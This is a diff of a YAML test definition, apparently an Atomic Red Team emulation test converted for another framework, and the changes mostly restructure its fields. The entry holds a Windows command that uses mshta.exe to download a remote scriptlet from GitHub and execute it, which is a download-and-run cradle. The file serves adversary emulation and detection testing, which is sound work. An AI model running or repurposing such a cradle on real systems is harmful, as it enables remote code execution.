@@ -1,15 +1,18 @@
-- id: 01d44fad-9119-51b1-aa8b-1c83b514e2f0
+- requirements: []
   name: Soumaia ART Tests - Powershell invoke mshta.exe download
   description: 'Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".
 
 
     Provided by https://github.com/mgreen27/mgreen27.github.io'
   tactic: execution
-  technique:
-    attack_id: T1059.001
-    name: 'Command and Scripting Interpreter: PowerShell'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
+  technique_id: T1059.001
+  technique_name: 'Command and Scripting Interpreter: PowerShell'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
+  id: 01d44fad-9119-51b1-aa8b-1c83b514e2f0
